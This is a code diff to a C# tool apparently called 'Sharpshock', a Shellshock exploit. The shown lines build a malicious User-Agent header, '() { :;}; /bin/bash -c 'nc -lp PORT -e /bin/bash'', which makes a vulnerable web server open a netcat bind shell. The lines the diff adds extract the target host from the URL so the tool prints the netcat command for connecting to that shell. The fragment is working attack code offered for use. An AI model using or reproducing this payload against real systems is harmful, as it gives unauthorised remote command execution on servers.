@@ -21,6 +21,8 @@ namespace Sharpshock
             var lhost = "";
             var port = 0;
 
+            var indexforRawserver = new List<int>();
+
             website = website + filePath;
 
 
@@ -76,10 +78,22 @@ namespace Sharpshock
                 Console.WriteLine("{0}[+] Pick a port", Environment.NewLine);
                 port = Int32.Parse(Console.ReadLine());
 
+                var rawServer = "";
+
+                for (var i = 0; i <  website.Length; i++)
+                {
+                    if(website[i] == '/' )
+                    {
+                        indexforRawserver.Add(i);
+                    }
+                }
+
+                rawServer = website.Substring(indexforRawserver[1] + 1, indexforRawserver[2] - 7);
+                
                 userAgent = "() { :;}; /bin/bash -c 'nc -lp" + " " + port + " -e /bin/bash'";
 
                 Console.WriteLine("[+] Server is now listening to incoming connections.{0}", Environment.NewLine);
-                Console.WriteLine("[+] Run this command: nc -v {0} {1} ", website, port);
+                Console.WriteLine("[+] Run this command: nc -v {0} {1} ", rawServer, port);
             }
             else
             {
